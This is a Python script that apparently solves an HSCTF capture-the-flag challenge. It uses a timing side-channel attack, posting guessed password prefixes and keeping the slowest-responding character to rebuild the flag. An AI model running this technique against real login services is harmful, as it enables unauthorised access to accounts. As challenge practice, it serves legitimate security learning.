#!/usr/bin/env python

''' The script brute forces the site and stores the character that is returned with the highest response time. '''
import requests
import string

host = "https://networked-password.web.chal.hsctf.com/"

charset = string.ascii_lowercase + string.digits + "{}_" # flag can container letters, digits, underscore, '{' and '}'
r = requests.get(url=host)

#print r.text

flag = "hsctf{"
resp = 0
fc = ""

while flag[-1]!= "}":
    for char in charset:
        payload = {"password" : flag + char}
        r = requests.post(url=host, data=payload)
        #print "current: ",flag+char," in ",r.elapsed.total_seconds()
        if r.elapsed.total_seconds() > resp:
            resp = r.elapsed.total_seconds()
            fc = char
    flag += fc
    resp = 0
    print "current: ",flag

print "FLAG: " + flag